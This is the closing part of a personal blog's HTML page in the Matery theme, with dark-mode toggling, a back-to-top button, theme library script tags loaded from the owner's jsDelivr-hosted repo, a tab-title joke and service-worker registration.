            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/materialize/materialize.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/aos/aos.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/js/matery.js"></script>

    

    
    
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

    
    
    <script async src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/instantpage/instantpage.js" type="module"></script>
    

    <script type="text/javascript">
        var OriginTitile=document.title,st;
        document.addEventListener("visibilitychange",function(){
            document.hidden?(document.title="ヽ(●-`Д´-)ノ你要玩捉迷藏嘛",clearTimeout(st)):(document.title="(Ő∀Ő3)ノ好哦！",st=setTimeout(function(){document.title=OriginTitile},3e3))
        })
    </script>
   
<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>